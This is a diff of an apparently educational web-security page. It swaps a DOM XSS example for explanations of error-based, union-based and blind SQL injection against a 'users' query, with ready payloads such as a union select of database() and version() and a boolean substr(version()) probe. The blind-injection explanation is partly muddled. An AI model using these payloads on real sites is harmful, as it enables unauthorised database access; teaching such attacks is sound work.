@@ -95,23 +95,26 @@
                                 <div class="modal-content">
                                     <span class="close">&times;</span>
                                     <pre >
-                                    $(window).on('hashchange', function(){
-                                        var post = $('div.card h5:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
-                                        if (post) post.get(0).scrollIntoView();
-                                    });
+                                    <p style="color: #c902b6;">In error-based SQL injection, the attacker tries to insert a malicious query with
+                                     the goal of receiving an error message that provides sensitive information about the database.
+
+                                     The attacker might try any type of SQL command in an input 
+                                     field parameter—such as a single quote, double quote, or SQL operators 
+                                     like AND, OR, NOT.</p>
+                                     SELECT * FROM users WHERE id=("1"") LIMIT 0,1
                                     </pre>
                                     <p style="color: #c902b6;">it doesn't sanitize well, what happens in roughly the code is the following:</p> 
                                             <pre >
+                                            SELECT * FROM users WHERE id=("1") or 1=1 -- ") LIMIT 0,1
                                             
-                                            $('section.blog-list h2:contains(' + Hello+ ')');
                                             </pre>
                                     <p style="color: #c902b6;">Therefore, if we put a payload like the following:</p> 
                                             <pre>
-                                            &lt;img src=/ onerror=print()&gt;
+                                            -1") union select 1,database(),version() --+
                                             </pre>   
                                     <p style="color: #c902b6;">More or less, something like this would happen:</p> 
                                             <pre>
-                                            $('section.blog-list h2:contains(' + &lt;img src=/ onerror=print()&gt; + ')');
+                                            SELECT * FROM users WHERE id=("-1") union select 1,database(),version() -- ") LIMIT 0,1
                                             </pre>
                                     
                                 </div>
@@ -128,23 +131,27 @@
                                 <div class="modal-content">
                                     <span class="close">&times;</span>
                                     <pre >
-                                    $(window).on('hashchange', function(){
-                                        var post = $('div.card h5:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
-                                        if (post) post.get(0).scrollIntoView();
-                                    });
+                                    <p style="color: #c902b6;"> Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. 
+    When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false 
+    questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible</p> 
+                                   
                                     </pre>
                                     <p style="color: #c902b6;">it doesn't sanitize well, what happens in roughly the code is the following:</p> 
                                             <pre >
                                             
-                                            $('section.blog-list h2:contains(' + Hello+ ')');
+                                            SELECT * FROM users WHERE id='1' and 6= 6-- ' LIMIT 0,1
                                             </pre>
                                     <p style="color: #c902b6;">Therefore, if we put a payload like the following:</p> 
                                             <pre>
-                                            &lt;img src=/ onerror=print()&gt;
+                                            ?id=1' and (select substr(version(),1,1))= 1--+
                                             </pre>   
                                     <p style="color: #c902b6;">More or less, something like this would happen:</p> 
                                             <pre>
-                                            $('section.blog-list h2:contains(' + &lt;img src=/ onerror=print()&gt; + ')');
+                                            SELECT * FROM users WHERE id='1' and (select substr(version(),1,1))= 1-- ' LIMIT 0,1
+
+                                            The false condition should return error or blank page. As shown in the query finds the 
+                                            page with id 1 but the condition substr(version(),1,1) 1=1 is false 
+                                            True and false implies false in Boolean and thus return the error page.  
                                             </pre>
                                     
                                 </div>
